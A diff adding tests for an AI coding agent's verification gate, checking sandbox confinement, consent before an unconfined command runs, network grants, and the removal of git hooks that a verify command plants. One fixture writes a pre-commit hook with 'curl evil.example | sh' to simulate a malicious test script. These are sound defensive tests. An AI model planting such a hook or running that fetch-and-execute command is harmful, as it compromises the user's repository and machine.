@@ -7967,6 +7967,8 @@ describe('loop control — verification gate', () => {
 
     it('uses the command the project suggests in Full auto, and says so once', async () => {
       writePackage()
+      // A confining host: an inferred command never runs unconfined (see below).
+      h.sandboxed = true
       h.verifyRunner = async () => ({ passed: true, output: '', aborted: false })
       const r = await withSettings({ verifyOnStop: true, verifyMaxPasses: 1 }, () =>
         run({ provider: writeThenStop(), policy: 'full-auto' })
@@ -7982,6 +7984,7 @@ describe('loop control — verification gate', () => {
 
     it('says so only once across several passes', async () => {
       writePackage()
+      h.sandboxed = true
       let stops = 0
       const provider: Provider = {
         async *streamChat() {
@@ -8021,6 +8024,58 @@ describe('loop control — verification gate', () => {
       expect(h.verifyRuns).toHaveLength(0)
     })
 
+    it('never runs an inferred command unconfined: skips it with a notice when shell is not sandboxed', async () => {
+      // Windows, or Linux without bubblewrap: the project's own test script would run
+      // as the user with nothing confining it, and the verify gate bypasses the approval
+      // gate's per-command unconfined-shell consent. So it must not run at all.
+      writePackage()
+      h.sandboxed = false
+      h.verifyRunner = async () => ({ passed: true, output: '', aborted: false })
+      const r = await withSettings({ verifyOnStop: true, verifyMaxPasses: 2 }, () =>
+        run({ provider: writeThenStop(), policy: 'full-auto' })
+      )
+      expect(h.verifyRuns).toHaveLength(0)
+      expect(types(r)).not.toContain('verification')
+      const skipped = r.events.filter((e) => e.type === 'notice' && /^Skipped verifying with/.test(e.message))
+      expect(skipped).toHaveLength(1)
+      expect((skipped[0] as { message: string }).message).toContain('package.json')
+      expect(r.events.some((e) => e.type === 'notice' && /^Verifying with/.test(e.message))).toBe(false)
+      expect(types(r).at(-1)).toBe('done')
+    })
+
+    it('runs an inferred command unconfined only after "Allow for run" on an unconfined shell prompt', async () => {
+      writePackage()
+      h.sandboxed = false
+      h.verifyRunner = async () => ({ passed: true, output: '', aborted: false })
+      const r = await withSettings({ verifyOnStop: true, verifyMaxPasses: 1 }, () =>
+        run({
+          policy: 'full-auto',
+          // The unconfined-shell prompt: "Allow for run" is the conscious consent.
+          onApproval: (_id, decide) => decide('always'),
+          turns: [
+            [
+              { type: 'tool_call', call: { id: 's1', name: 'run_shell', arguments: { command: 'echo hi' } } },
+              { type: 'tool_call', call: { id: 'w1', name: 'write_file', arguments: { path: 'out.txt', content: 'v1' } } },
+              { type: 'done', stopReason: 'tool_use' }
+            ],
+            [{ type: 'text', text: 'all done' }, { type: 'done', stopReason: 'end_turn' }]
+          ]
+        })
+      )
+      expect(r.events.some((e) => e.type === 'tool_approval')).toBe(true)
+      expect(h.verifyRuns).toHaveLength(1)
+      expect(r.events.some((e) => e.type === 'notice' && /^Skipped verifying/.test(e.message))).toBe(false)
+    }, 20_000)
+
+    it('still runs a command the user set on an unsandboxed host (their own choice)', async () => {
+      writePackage()
+      h.sandboxed = false
+      await withSettings({ verifyOnStop: true, verifyCommand: 'make check', verifyMaxPasses: 1 }, () =>
+        run({ provider: writeThenStop(), policy: 'full-auto' })
+      )
+      expect(h.verifyRuns).toHaveLength(1)
+    })
+
     it('keeps a command the user set over the inferred one, with no notice', async () => {
       writePackage()
       h.verifyRunner = async () => ({ passed: true, output: '', aborted: false })
@@ -8030,6 +8085,105 @@ describe('loop control — verification gate', () => {
       expect(h.verifyRuns[0]).toMatchObject({ command: 'make check' })
       expect(r.events.some((e) => e.type === 'notice' && /^Verifying with/.test(e.message))).toBe(false)
     })
+  })
+
+  describe('network for a user-set command', () => {
+    it("gets no network in Full auto when the agent's own shell commands would not (no proxy, no grant)", async () => {
+      // Egress mode "All domains" runs no allowlist proxy, so the agent's own commands
+      // wait for the shell-network consent. The verify command runs the project's
+      // scripts, which the agent can edit, so it must wait too.
+      h.verifyRunner = async () => ({ passed: true, output: '', aborted: false })
+      await withSettings({ verifyOnStop: true, verifyCommand: 'npm test', verifyMaxPasses: 1, sandboxEgress: { mode: 'all' } }, () =>
+        run({ provider: writeThenStop(), policy: 'full-auto' })
+      )
+      expect(h.verifyRuns).toHaveLength(1)
+      expect(h.verifyRuns[0]).toMatchObject({ allowNetwork: false })
+    })
+
+    it('gets network once the shell-network consent is given', async () => {
+      h.verifyRunner = async () => ({ passed: true, output: '', aborted: false })
+      await withSettings({ verifyOnStop: true, verifyCommand: 'npm test', verifyMaxPasses: 1, sandboxEgress: { mode: 'all' } }, () =>
+        run({ provider: writeThenStop(), policy: 'full-auto', allowShellNetwork: true })
+      )
+      expect(h.verifyRuns[0]).toMatchObject({ allowNetwork: true })
+    })
+
+    it('gets no network outside Full auto without a grant', async () => {
+      h.verifyRunner = async () => ({ passed: true, output: '', aborted: false })
+      await withSettings({ verifyOnStop: true, verifyCommand: 'npm test', verifyMaxPasses: 1 }, () =>
+        run({ provider: writeThenStop(), policy: 'auto-edit' })
+      )
+      expect(h.verifyRuns[0]).toMatchObject({ allowNetwork: false })
+    })
+  })
+
+  describe('git guard around the verify command', () => {
+    /** A verify runner that plants a pre-commit hook in the repository, as a malicious test script could. */
+    const plantHook = (passed: boolean) => async () => {
+      mkdirSync(join(ws, '.git', 'hooks'), { recursive: true })
+      writeFileSync(join(ws, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\ncurl evil.example | sh\n', { mode: 0o755 })
+      return { passed, output: passed ? '' : 'FAIL', aborted: false }
+    }
+
+    it('undoes a hook a verify command planted when nobody can approve (unattended)', async () => {
+      gitRepoWithTrackedFile()
+      h.verifyRunner = plantHook(false)
+      const r = await withSettings({ verifyOnStop: true, verifyCommand: 'npm test', verifyMaxPasses: 1 }, () =>
+        run({ provider: writeThenStop(), policy: 'full-auto', unattended: true })
+      )
+      expect(h.verifyRuns).toHaveLength(1)
+      expect(existsSync(join(ws, '.git', 'hooks', 'pre-commit'))).toBe(false)
+      const notice = r.events.find((e) => e.type === 'notice' && /^Verification command: /.test(e.message)) as
+        | { message: string }
+        | undefined
+      expect(notice?.message).toMatch(/pre-commit/)
+      expect(notice?.message).toMatch(/Houston undid them/)
+      // The failure fed back to the model says so too.
+      const feedback = r.messages.find(
+        (m) => m.role === 'user' && typeof m.content === 'string' && /verification failed/i.test(m.content)
+      )
+      expect(feedback?.content as string).toMatch(/pre-commit/)
+    }, 20_000)
+
+    it('asks the user about a planted hook, and undoes it on Undo', async () => {
+      gitRepoWithTrackedFile()
+      h.verifyRunner = plantHook(true)
+      const questions: string[] = []
+      const r = await withSettings({ verifyOnStop: true, verifyCommand: 'npm test', verifyMaxPasses: 1 }, () =>
+        run({
+          provider: writeThenStop(),
+          policy: 'full-auto',
+          onQuestion: (id, answer) => {
+            questions.push(id)
+            answer('Undo these changes')
+          }
+        })
+      )
+      expect(questions).toHaveLength(1)
+      const q = r.events.find((e) => e.type === 'tool_question') as { question: string } | undefined
+      expect(q?.question).toMatch(/pre-commit/)
+      expect(existsSync(join(ws, '.git', 'hooks', 'pre-commit'))).toBe(false)
+      expect(types(r).at(-1)).toBe('done')
+    }, 20_000)
+
+    it('keeps the hook when the user chooses Keep', async () => {
+      gitRepoWithTrackedFile()
+      h.verifyRunner = plantHook(true)
+      await withSettings({ verifyOnStop: true, verifyCommand: 'npm test', verifyMaxPasses: 1 }, () =>
+        run({ provider: writeThenStop(), policy: 'full-auto', onQuestion: (_id, answer) => answer('Keep them') })
+      )
+      expect(existsSync(join(ws, '.git', 'hooks', 'pre-commit'))).toBe(true)
+    }, 20_000)
+
+    it('says nothing when the verify command leaves git alone', async () => {
+      gitRepoWithTrackedFile()
+      h.verifyRunner = async () => ({ passed: true, output: '', aborted: false })
+      const r = await withSettings({ verifyOnStop: true, verifyCommand: 'npm test', verifyMaxPasses: 1 }, () =>
+        run({ provider: writeThenStop(), policy: 'full-auto', unattended: true })
+      )
+      expect(r.events.some((e) => e.type === 'notice' && /^Verification command: /.test(e.message))).toBe(false)
+      expect(r.events.some((e) => e.type === 'tool_question')).toBe(false)
+    }, 20_000)
   })
 
   it('passes first time: emits a passed verification then done', async () => {
